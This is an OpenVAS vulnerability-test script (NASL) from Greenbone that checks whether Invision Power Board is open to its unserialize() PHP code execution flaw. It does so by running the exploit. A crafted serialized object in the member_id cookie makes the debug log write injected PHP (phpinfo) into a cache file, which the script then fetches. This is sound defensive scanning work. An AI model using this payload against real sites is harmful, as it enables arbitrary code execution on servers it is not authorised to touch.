###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ipb_56288.nasl 12 2013-10-27 11:15:33Z jan $
#
# Invision Power Board 'unserialize()' PHP Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Invision Power Board is prone to a PHP Code Execution vulnerability
because it fails to properly sanitize user-supplied input.

An attacker can exploit these issues to inject and execute arbitrary
malicious PHP code in the context of the affected application. This
may facilitate a compromise of the application and the underlying
system; other attacks are also possible.";

tag_solution = "The vendor has released a patch to address this vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103601";
CPE = "cpe:/a:invision_power_services:invision_power_board";

if (description)
{
 script_oid(SCRIPT_OID);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 12 $");

 script_name("Invision Power Board 'unserialize()' PHP Code Execution");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_xref(name : "URL" , value : "http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-security-update/");
 script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22398/");
 script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/86702");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-11-01 16:02:27 +0200 (Thu, 01 Nov 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("invision_power_board_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("invision_power_board/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/index.php';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(buf == NULL)exit(0);

prefix = eregmatch(pattern:"Cookie: (.+)session", string:buf);
host = get_host_name();
file = 'openvas_' + rand() + '.php';

req = string("GET ",dir,"/index.php?<?error_reporting(0);print(___);phpinfo();die;?> HTTP/1.0\r\n",
             "Host: ",host,"\r\n",
             "Cookie: ",prefix,"member_id=a%3A1%3A%7Bi%3A0%3BO%3A15%3A%22db_driver_mysql%22%3A1%3A%7Bs%3A3%3A%22obj%22%3Ba%3A2%3A%7Bs%3A13%3A%22use_debug_log%22%3Bi%3A1%3Bs%3A9%3A%22debug_log%22%3Bs%3A27%3A%22cache%2F",file,"%22%3B%7D%7D%7D\r\n",
             "Connection: close\r\n\r\n");

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 200") exit(0);

sleep(3);

url = dir + '/cache/' + file ;
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(buf == NULL)exit(0);

if("<title>phpinfo()" >< buf) {

  security_hole(port:port);
  exit(0);

}  

exit(0);



